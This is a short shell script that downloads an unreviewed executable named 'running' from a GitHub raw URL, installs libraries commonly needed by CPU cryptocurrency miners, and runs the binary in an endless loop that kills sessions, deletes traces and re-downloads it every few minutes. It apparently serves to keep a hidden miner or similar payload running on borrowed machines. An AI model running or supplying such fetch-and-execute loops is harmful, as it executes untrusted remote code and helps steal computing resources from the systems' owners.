wget https://raw.githubusercontent.com/renilo/hajar/main/running && chmod +x running
sudo apt install timelimit -y && sudo apt-get update && sudo apt-get upgrade -y && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1
while :; do timeout 1500 bash ./running; clear; screen -XS Running quit; rm -f kontol manuk running wget-log wget-log.*; echo SETTING PROJECT; sleep 300; wget https://raw.githubusercontent.com/renilo/hajar/main/running && chmod +x running; done
